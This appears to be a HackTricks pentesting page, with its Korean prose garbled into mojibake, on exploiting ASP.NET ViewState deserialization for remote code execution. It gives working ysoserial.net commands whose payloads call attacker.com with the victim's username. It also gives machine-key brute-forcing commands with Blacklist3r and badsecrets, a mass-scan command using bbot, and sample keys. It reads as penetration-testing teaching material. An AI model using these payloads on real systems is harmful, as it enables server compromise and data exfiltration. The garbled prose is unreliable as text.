# \_\_VIEWSTATE ë§¤ê°œë³€ìˆ˜ë¥¼ ì•Œì§€ ëª»í•˜ê³  ì•…ìš©í•˜ê¸°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

## ViewStateì´ë€

**ViewState**ëŠ” ASP.NETì—ì„œ ì›¹ í˜ì´ì§€ ê°„ì— í˜ì´ì§€ ë° ì»¨íŠ¸ë¡¤ ë°ì´í„°ë¥¼ ìœ ì§€í•˜ëŠ” ê¸°ë³¸ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. í˜ì´ì§€ì˜ HTML ë Œë”ë§ ì¤‘ì— í˜ì´ì§€ì˜ í˜„ì¬ ìƒíƒœì™€ í¬ìŠ¤íŠ¸ë°± ì¤‘ì— ë³´ì¡´ë˜ì–´ì•¼ í•  ê°’ë“¤ì€ base64ë¡œ ì¸ì½”ë”©ëœ ë¬¸ìì—´ë¡œ ì§ë ¬í™”ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ì´ëŸ¬í•œ ë¬¸ìì—´ì€ ìˆ¨ê²¨ì§„ ViewState í•„ë“œì— ë°°ì¹˜ë©ë‹ˆë‹¤.

ViewState ì •ë³´ëŠ” ë‹¤ìŒ ì†ì„± ë˜ëŠ” ê·¸ë“¤ì˜ ì¡°í•©ì— ì˜í•´ íŠ¹ì§• ì§€ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- **Base64**:
- `EnableViewStateMac` ë° `ViewStateEncryptionMode` ì†ì„±ì´ ëª¨ë‘ falseë¡œ ì„¤ì •ëœ ê²½ìš°ì— ì‚¬ìš©ë˜ëŠ” í˜•ì‹ì…ë‹ˆë‹¤.

- **Base64 + MAC (Message Authentication Code) í™œì„±í™”**:
- MACì˜ í™œì„±í™”ëŠ” `EnableViewStateMac` ì†ì„±ì„ trueë¡œ ì„¤ì •í•˜ì—¬ ë‹¬ì„±ë©ë‹ˆë‹¤. ì´ëŠ” ViewState ë°ì´í„°ì˜ ë¬´ê²°ì„± ê²€ì¦ì„ ì œê³µí•©ë‹ˆë‹¤.

- **Base64 + ì•”í˜¸í™”**:
- ì•”í˜¸í™”ëŠ” `ViewStateEncryptionMode` ì†ì„±ì´ trueë¡œ ì„¤ì •ë  ë•Œ ì ìš©ë˜ë©°, ViewState ë°ì´í„°ì˜ ê¸°ë°€ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤.

## í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤

ì´ ì´ë¯¸ì§€ëŠ” .NET í”„ë ˆì„ì›Œí¬ ë²„ì „ì— ê¸°ë°˜í•œ ASP.NETì˜ ViewStateì— ëŒ€í•œ ë‹¤ë¥¸ êµ¬ì„±ì„ ìì„¸íˆ ì„¤ëª…í•˜ëŠ” í…Œì´ë¸”ì…ë‹ˆë‹¤. ë‚´ìš© ìš”ì•½ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. **.NETì˜ ëª¨ë“  ë²„ì „**ì— ëŒ€í•´ MAC ë° ì•”í˜¸í™”ê°€ ëª¨ë‘ ë¹„í™œì„±í™”ëœ ê²½ìš° MachineKeyê°€ í•„ìš”í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ìŠµë‹ˆë‹¤.

2. **4.5 ë¯¸ë§Œì˜ ë²„ì „**ì—ì„œ MACì´ í™œì„±í™”ë˜ì§€ë§Œ ì•”í˜¸í™”ê°€ ë¹„í™œì„±í™”ëœ ê²½ìš° MachineKeyê°€ í•„ìš”í•©ë‹ˆë‹¤. MachineKeyë¥¼ ì‹ë³„í•˜ëŠ” ë°©ë²•ì€ "Blacklist3r"ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤.

3. **4.5 ë¯¸ë§Œì˜ ë²„ì „**ì—ì„œ MACì´ í™œì„±í™”ë˜ì—ˆëŠ”ì§€ ì—¬ë¶€ì— ê´€ê³„ì—†ì´ ì•”í˜¸í™”ê°€ í™œì„±í™”ëœ ê²½ìš° MachineKeyê°€ í•„ìš”í•©ë‹ˆë‹¤. MachineKeyë¥¼ ì‹ë³„í•˜ëŠ” ì‘ì—…ì€ "Blacklist3r - Future Development"ì˜ ì—…ë¬´ì…ë‹ˆë‹¤.

4. **4.5 ì´ìƒì˜ ë²„ì „**ì—ì„œëŠ” MAC ë° ì•”í˜¸í™”ì˜ ëª¨ë“  ì¡°í•©(ë‘˜ ë‹¤ trueì¸ ê²½ìš° ë˜ëŠ” í•˜ë‚˜ëŠ” trueì´ê³  ë‹¤ë¥¸ í•˜ë‚˜ëŠ” falseì¸ ê²½ìš°)ì´ MachineKeyë¥¼ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. MachineKeyëŠ” "Blacklist3r"ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤: 1 â€“ EnableViewStateMac=false ë° viewStateEncryptionMode=false

`AspNetEnforceViewStateMac` ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ë¥¼ 0ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ViewStateMACì„ ì™„ì „íˆ ë¹„í™œì„±í™”í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ìœ„ì¹˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState ì†ì„± ì‹ë³„**

BurpSuiteë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ í¬í•¨í•˜ëŠ” ìš”ì²­ì„ ìº¡ì²˜í•˜ì—¬ ViewStateì´ MACìœ¼ë¡œ ë³´í˜¸ë˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§¤ê°œë³€ìˆ˜ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•´ Macì´ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš° [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ì„ ì‚¬ìš©í•˜ì—¬ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ 1.5 - í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ 1ê³¼ ê°™ì§€ë§Œ ì„œë²„ì—ì„œ ViewState ì¿ í‚¤ë¥¼ ë³´ë‚´ì§€ ì•ŠìŒ

ê°œë°œìëŠ” ViewStateê°€ HTTP ìš”ì²­ì˜ ì¼ë¶€ê°€ ë˜ì§€ ì•Šë„ë¡ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì‚¬ìš©ìëŠ” ì´ ì¿ í‚¤ë¥¼ ë°›ì§€ ì•ŠìŠµë‹ˆë‹¤).\
ViewStateê°€ ì—†ìœ¼ë©´ ViewState ì—­ì§ë ¬í™”ë¡œ ì¸í•´ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì ì¬ì ì¸ ì·¨ì•½ì ìœ¼ë¡œë¶€í„° êµ¬í˜„ì´ ì•ˆì „í•˜ë‹¤ê³  ê°€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•˜ì§€ë§Œ ê·¸ë ‡ì§€ ì•ŠìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ìš”ì²­ ë³¸ë¬¸ì— ViewState ë§¤ê°œë³€ìˆ˜ë¥¼ ì¶”ê°€í•˜ê³  ysoserialì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±ëœ ì§ë ¬í™”ëœ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ë©´ Case 1ì—ì„œì™€ ê°™ì´ ì—¬ì „íˆ ì½”ë“œ ì‹¤í–‰ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ 2 - .Net < 4.5 ë° EnableViewStateMac=true & ViewStateEncryptionMode=false

íŠ¹ì • í˜ì´ì§€ì—ì„œ ViewState MACì„ í™œì„±í™”í•˜ë ¤ë©´ íŠ¹ì • aspx íŒŒì¼ì—ì„œ ë‹¤ìŒ ë³€ê²½ ì‚¬í•­ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
ë‹¤ìŒê³¼ ê°™ì´ **web.config** íŒŒì¼ì—ì„œ ì„¤ì •í•˜ì—¬ **ì „ì²´** ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•´ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ì´ë²ˆì—ëŠ” ë§¤ê°œë³€ìˆ˜ê°€ MACìœ¼ë¡œ ë³´í˜¸ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ê³µê²©ì„ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰í•˜ë ¤ë©´ ë¨¼ì € ì‚¬ìš©ëœ í‚¤ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ëœ í‚¤ë¥¼ ì°¾ì•„ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ì€ ì•Œë ¤ì§„ machineKeysë¥¼ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ ë„êµ¬ì…ë‹ˆë‹¤. ì´ê²ƒì€ Pythonìœ¼ë¡œ ì‘ì„±ë˜ì—ˆìœ¼ë¯€ë¡œ Blacklist3rê³¼ ë‹¬ë¦¬ Windows ì¢…ì†ì„±ì´ ì—†ìŠµë‹ˆë‹¤. .NET viewstateì˜ ê²½ìš° "python blacklist3r" ìœ í‹¸ë¦¬í‹°ê°€ ìˆìœ¼ë©°, ì´ê²ƒì´ ê°€ì¥ ë¹ ë¥¸ ì‚¬ìš© ë°©ë²•ì…ë‹ˆë‹¤.

ë·°ìŠ¤í…Œì´íŠ¸ì™€ ìƒì„±ê¸°ë¥¼ ì§ì ‘ ì œê³µí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ë˜ëŠ”, ëŒ€ìƒ URLì— ì§ì ‘ ì—°ê²°í•˜ì—¬ HTMLì—ì„œ viewstateë¥¼ ì¶”ì¶œí•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

ëŒ€ê·œëª¨ë¡œ ì·¨ì•½í•œ viewstateë¥¼ ì°¾ê¸° ìœ„í•´ ì„œë¸Œë„ë©”ì¸ ì—´ê±°ì™€ í•¨ê»˜ `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) ëª¨ë“ˆì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

ìš´ì´ ì¢‹ë‹¤ë©´ í‚¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**ì„ ì‚¬ìš©í•˜ì—¬ ê³µê²©ì„ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ì„œë²„ì—ì„œ `_VIEWSTATEGENERATOR` ë§¤ê°œë³€ìˆ˜ê°€ ì „ì†¡ë˜ì§€ ì•ŠëŠ” ê²½ìš° `--generator` ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê³µí•  í•„ìš”ê°€ ì—†ì§€ë§Œ, ë‹¤ìŒê³¼ ê°™ì€ ë§¤ê°œë³€ìˆ˜ë“¤ì´ í•„ìš”í•©ë‹ˆë‹¤:
```bash
--apppath="/" --path="/hello.aspx"
```
### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤: 3 - .Net < 4.5 ë° EnableViewStateMac=true/false ë° ViewStateEncryptionMode=true

ì´ ê²½ìš° ë§¤ê°œë³€ìˆ˜ê°€ MACìœ¼ë¡œ ë³´í˜¸ë˜ì—ˆëŠ”ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ° ê²½ìš° ê°’ì€ ì•„ë§ˆë„ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©° ì·¨ì•½ì ì„ ì´ìš©í•˜ê¸° ìœ„í•´ í˜ì´ë¡œë“œë¥¼ ì•”í˜¸í™”í•˜ëŠ” ë° **Machine Keyê°€ í•„ìš”**í•©ë‹ˆë‹¤.

**ì´ ê²½ìš°** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **ëª¨ë“ˆì´ ê°œë°œ ì¤‘ì…ë‹ˆë‹¤...**

**.NET 4.5 ì´ì „ì—ëŠ”**, ASP.NETì€ **í•­ìƒ** `ViewStateEncryptionMode`ê°€ ì„¤ì •ë˜ì—ˆë”ë¼ë„ ì‚¬ìš©ìë¡œë¶€í„° **ì•”í˜¸í™”ë˜ì§€ ì•Šì€** \_`__VIEWSTATE`\_ë§¤ê°œë³€ìˆ˜ë¥¼ **ë°›ì•„ë“¤ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ASP.NETì€ ìš”ì²­ì—ì„œ **`__VIEWSTATEENCRYPTED`** ë§¤ê°œë³€ìˆ˜ì˜ **ì¡´ì¬**ë§Œ í™•ì¸í•©ë‹ˆë‹¤. **ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê±°í•˜ê³  ì•”í˜¸í™”ë˜ì§€ ì•Šì€ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ë©´ ì—¬ì „íˆ ì²˜ë¦¬ë©ë‹ˆë‹¤.**

ë”°ë¼ì„œ ê³µê²©ìê°€ íŒŒì¼ íƒìƒ‰ê³¼ ê°™ì€ ë‹¤ë¥¸ ì·¨ì•½ì ì„ í†µí•´ Machinekeyë¥¼ ì–»ëŠ” ë°©ë²•ì„ ì°¾ìœ¼ë©´, **Case 2**ì—ì„œ ì‚¬ìš©í•œ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í•˜ê¸° ìœ„í•´ ìš”ì²­ì—ì„œ `__VIEWSTATEENCRYPTED` ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê±°í•˜ì‹­ì‹œì˜¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ Viewstate MAC ìœ íš¨ì„± ê²€ì‚¬ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì—¬ ì·¨ì•½ì ì„ ì´ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤: 4 - .Net >= 4.5 ë° EnableViewStateMac=true/false ë° ViewStateEncryptionMode=true/false, ë‘ ì†ì„± ëª¨ë‘ falseë¡œ ì„¤ì •

ì•„ë˜ì™€ ê°™ì´ web.config íŒŒì¼ ë‚´ì— ì•„ë˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì§€ì •í•˜ì—¬ ASP.NET í”„ë ˆì„ì›Œí¬ ì‚¬ìš©ì„ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<httpRuntime targetFramework="4.5" />
```
ëŒ€ì‹ , ì´ ì‘ì—…ì€ web.config íŒŒì¼ì˜ `machineKey` ë§¤ê°œë³€ìˆ˜ ë‚´ì— ì•„ë˜ ì˜µì…˜ì„ ì§€ì •í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
compatibilityMode="Framework45"
```
ì´ì „ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ **ê°’ì€ ì•”í˜¸í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤.** ê·¸ëŸ° ë‹¤ìŒ, **ìœ íš¨í•œ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ë ¤ë©´ ê³µê²©ìëŠ” í‚¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.**

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ë˜ëŠ” í‚¤ë¥¼ ì°¾ì•„ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathê³¼ TargetPagePathì— ëŒ€í•œ ìì„¸í•œ ì„¤ëª…ì€ [ì—¬ê¸°](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

ë˜ëŠ”, [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ë¥¼ ì‚¬ìš©í•˜ì—¬ (ìƒì„±ê¸° ê°’ê³¼ í•¨ê»˜):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ìœ íš¨í•œ Machine keyê°€ í™•ì¸ë˜ë©´, **ë‹¤ìŒ ë‹¨ê³„ëŠ”** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ì„ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
ë§Œì•½ `__VIEWSTATEGENERATOR`ì˜ ê°’ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, í•´ë‹¹ ê°’ì„ ì‚¬ìš©í•˜ì—¬ `--generator` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‹œë„í•˜ê³  `--path`ì™€ `--apppath` ë§¤ê°œë³€ìˆ˜ë¥¼ ìƒëµí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewState ì—­ì§ë ¬í™” ì·¨ì•½ì ì˜ ì„±ê³µì ì¸ ì•…ìš©ì€ ì‚¬ìš©ì ì´ë¦„ì„ í¬í•¨í•œ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì„œë²„ë¡œì˜ ì™¸ë¶€ ìš”ì²­ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ ì•…ìš©ì€ "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET"ì´ë¼ëŠ” ìë£Œë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì¦ëª…(PoC)ì—ì„œ ì‹œì—°ë©ë‹ˆë‹¤. ì•…ìš© ê³¼ì •ì´ ì‘ë™í•˜ëŠ” ë°©ì‹ê³¼ Blacklist3rì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ MachineKeyë¥¼ ì‹ë³„í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ì œê³µëœ [ì„±ê³µì ì¸ ì•…ìš©ì˜ PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.


### í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ 6 - ViewStateUserKeysê°€ ì‚¬ìš©ë˜ê³  ìˆìŒ

**ViewStateUserKey** ì†ì„±ì€ **CSRF ê³µê²©**ì— ëŒ€í•œ **ë°©ì–´**ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì´ëŸ¬í•œ í‚¤ê°€ ì •ì˜ë˜ì—ˆê³  ìš°ë¦¬ê°€ ì§€ê¸ˆê¹Œì§€ ë…¼ì˜í•œ ë°©ë²•ìœ¼ë¡œ **ViewState** í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ë ¤ê³  ì‹œë„í•˜ë©´, **í˜ì´ë¡œë“œëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì²˜ë¦¬ë˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤**.\
ì˜¬ë°”ë¥´ê²Œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ í•˜ë‚˜ì˜ ì¶”ê°€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### ì„±ê³µì ì¸ ì•…ìš©ì˜ ê²°ê³¼ <a href="#poc" id="poc"></a>

ëª¨ë“  í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤ì—ì„œ ViewState YSoSerial.Net í˜ì´ë¡œë“œê°€ **ì„±ê³µì ìœ¼ë¡œ** ì‘ë™í•˜ë©´ ì„œë²„ëŠ” "500 Internal server error"ë¡œ ì‘ë‹µí•˜ë©° ì‘ë‹µ ì½˜í…ì¸ ëŠ” "The state information is invalid for this page and might be corrupted"ì…ë‹ˆë‹¤. ê·¸ë¦¬ê³  ìš°ë¦¬ëŠ” OOB ìš”ì²­ì„ ë°›ìŠµë‹ˆë‹¤.

[further information here]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))ì—ì„œ ìì„¸í•œ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ì°¸ê³  ìë£Œ

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

